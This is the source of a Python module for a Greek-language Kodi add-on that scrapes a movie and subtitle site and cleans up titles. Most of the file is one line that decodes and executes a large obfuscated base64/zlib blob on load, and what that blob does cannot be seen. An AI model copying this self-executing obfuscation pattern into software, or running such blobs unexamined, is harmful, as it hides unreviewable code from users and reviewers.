# -*- coding: utf-8 -*-

import xbmcgui
import xbmcaddon
import xbmc
import re
import requests
import six
from six.moves.urllib_parse import quote_plus
from resources.lib.modules import client
from resources.lib.modules import control
from resources.lib.modules import views
from resources.lib.modules import dom_parser as dom
from resources.lib.modules.control import addDir
ADDON       = xbmcaddon.Addon()
ADDON_DATA  = ADDON.getAddonInfo('profile')
ADDON_PATH  = ADDON.getAddonInfo('path')
DESCRIPTION = ADDON.getAddonInfo('description')
FANART      = ADDON.getAddonInfo('fanart')
ICON        = ADDON.getAddonInfo('icon')
ID          = ADDON.getAddonInfo('id')
NAME        = ADDON.getAddonInfo('name')
VERSION     = ADDON.getAddonInfo('version')
Lang        = control.lang
Dialog      = xbmcgui.Dialog()
vers = VERSION
ART = ADDON_PATH + "/resources/icons/"
subs4free = 'https://www.subs4free.club'
Trailer = '[B][COLOR=lime]Τρέιλερ[/COLOR][/B]'
page = '[B][COLOR=lime]Επόμενη σελίδα >>[/COLOR][/B]'
se = 'Αναζήτηση Ταινίας - Τήλ.Σειράς'

def clear_Title(txt):
    import six
    if six.PY2:
        txt = txt.encode('utf-8', 'ignore')
    else:
        txt = six.ensure_text(txt, encoding='utf-8', errors='ignore')
    txt = re.sub(r'<.+?>', '', txt)
    txt = re.sub(r'var\s+cp.+?document.write\(\'\'\);\s*', '', txt)
    txt = txt.replace("&quot;", "\"").replace('()', '').replace("&#038;", "&").replace('&#8211;', ':').replace('\n',
                                                                                                               ' ')
    txt = txt.replace("&amp;", "&").replace('&#8217;', "'").replace('&#039;', ':').replace('&#;', '\'').replace('&#8230;', '...')
    txt = txt.replace("&#38;", "&").replace('&#8221;', '"').replace('&#8216;', '"').replace('&#160;', '')
    txt = txt.replace("&nbsp;", "").replace('&#8220;', '"').replace('&#8216;', '"').replace('\t', ' ')
    txt = txt.replace('οσ ', 'ος ').replace('οσ:', 'ος:').replace('ασ ', 'ας ').replace('εσ ', 'ες ').replace('ησ ', 'ης ').replace('εισ ', 'εις ').replace('Τησ ', 'Της ')
    return txt
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))

